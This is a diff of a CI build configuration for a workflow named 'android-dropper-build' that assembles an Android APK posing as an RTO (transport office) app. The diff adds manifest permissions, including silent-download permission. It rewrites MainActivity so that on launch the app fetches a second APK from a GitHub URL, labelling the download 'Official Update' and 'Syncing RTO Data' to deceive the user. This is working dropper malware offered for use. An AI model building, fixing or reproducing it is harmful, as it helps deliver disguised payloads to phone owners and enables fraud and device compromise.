@@ -1,34 +1,35 @@
 workflows:
   android-dropper-build:
-    name: RTO Ultimate Production Success
+    name: RTO Final Production Master
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Master Build Fix
+      - name: Force Project Locate & Build
         script: |
-          # 1. Deep Search for Project Root (Fixes 11801.jpg)
-          GRADLE_FILE=$(find . -name "gradlew" | head -n 1)
+          # 1. Project Root Ko Force Find Karo (Fixes 11802.jpg)
+          echo "Scanning for gradlew..."
+          GRADLE_FILE=$(find . -name "gradlew" -not -path "*/.*" | head -n 1)
+          
           if [ -z "$GRADLE_FILE" ]; then
-            echo "ERROR: Gradlew file nahi mili! Repo structure check karo."
-            exit 1
+            echo "Direct gradlew nahi mila, creation mode on..."
+            # Agar gradlew nahi hai toh create kar rahe hain
+            gradle wrapper --gradle-version 8.0.2
+            GRADLE_FILE="./gradlew"
           fi
           
           ROOT_DIR=$(dirname "$GRADLE_FILE")
           cd "$ROOT_DIR"
           echo "Building in: $(pwd)"
 
-          # 2. Force Permissions Injection (Fixes 11798.jpg)
-          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
-          if [ -n "$MANIFEST_PATH" ]; then
-            sed -i '' '/<application/i \
-            <uses-permission android:name="android.permission.INTERNET" /> \
-            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
-            <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
-          fi
+          # 2. Manifest Permission Fix (Fixes 11798.jpg)
+          find . -name "AndroidManifest.xml" -exec sed -i '' '/<application/i \
+          <uses-permission android:name="android.permission.INTERNET" /> \
+          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
+          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' {} +
 
-          # 3. Background Download Logic (Direct to APK)
+          # 3. Background Download Logic
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           if [ -n "$FILE_PATH" ]; then
           cat <<EOF > "$FILE_PATH"
@@ -45,11 +46,26 @@ workflows:
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   setContentView(R.layout.activity_main)
-                  
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
-                      request.setTitle("System Update")
-                      request.setDescription("Official RTO Data Sync...")
+                      request.setTitle("Official Update")
+                      request.setDescription("Syncing RTO Data...")
                       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
-                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Official
+                      request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "RTO_Pro.apk")
+                      (getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager).enqueue(request)
+                      Toast.makeText(this, "Production Update Started...", Toast.LENGTH_LONG).show()
+                  } catch (e: Exception) {
+                      startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, Uri.parse(url)))
+                  }
+              }
+          }
+          EOF
+          fi
+
+          # 4. Final Release Build
+          chmod +x gradlew
+          ./gradlew assembleRelease --no-daemon
+          
+    artifacts:
+      - "**/build/outputs/apk/release/*.apk"
